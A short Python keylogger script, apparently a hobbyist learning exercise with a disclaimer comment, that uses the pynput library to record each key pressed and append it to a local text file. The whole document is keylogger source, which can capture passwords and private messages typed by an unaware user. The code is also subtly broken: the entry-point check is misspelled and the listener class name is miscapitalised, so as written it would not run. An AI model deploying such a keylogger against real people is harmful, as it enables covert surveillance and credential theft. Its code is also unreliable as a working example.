#This Keylogger is for learning purposes only and is not to be used in malicious ways
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("error getting char")
    

    
if __name__ == "_main_":
    listener = keyboard.listener(on_press =keyPressed)
    listener.start()
    input()
